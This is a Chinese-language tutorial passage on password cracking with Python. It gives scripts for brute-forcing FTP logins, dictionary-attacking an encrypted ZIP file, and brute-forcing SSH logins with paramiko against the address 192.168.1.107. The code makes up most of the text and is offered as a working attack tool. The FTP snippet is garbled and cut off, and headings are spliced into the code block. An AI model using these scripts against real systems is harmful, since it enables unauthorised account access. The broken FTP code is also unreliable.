### 暴力破解ftp

```
 import ftplib
import sys

                       ftp\_login.login(user.strip(),password.strip())
                       print('login succssful:'+user+' '+password)
                       return True
                   except Exception as e:

# 实例2 ZIP文件破解

### 新建ZIP加密文件

### Python zipfile库介绍

1、zipfile.ZipFile('filename') 

2、z.extractall(pwd=password) 

注意password的转bytes

  

### 案例

破解对应密码 

使用异常处理 

使用字典破解

```
 import zipfile
import sys
z=zipfile.ZipFile('1.zip')

with open('2.txt','r') as f:
   list1=f.readlines()

for i in list1:
   try:

       z.extractall(pwd=bytes(i.strip(), encoding='utf-8'))
       print('密码为:'+i)
       break
   except:
       pass


```

### 破解案例

client = paramiko.SSHClient() client.connect(hostname,username,password) 文件读写与异常处理结合

```
 import paramiko
import sys

ssh=paramiko.SSHClient()
ssh.set\_missing\_host\_key\_policy(paramiko.AutoAddPolicy())

with open('users.txt') as user\_txt:
   with open('pass.txt') as pass\_txt:
       user\_s=user\_txt.readlines()
       pass\_s=pass\_txt.readlines()
       print(user\_s,pass\_s)
       for i in user\_s:
           for j in pass\_s:
               try:
                   ssh.connect('192.168.1.107', username=i.strip(), password=j.strip())
                   print('账号为:'+i+' 密码为:'+j)
                   exit(0)
               except:
                   pass
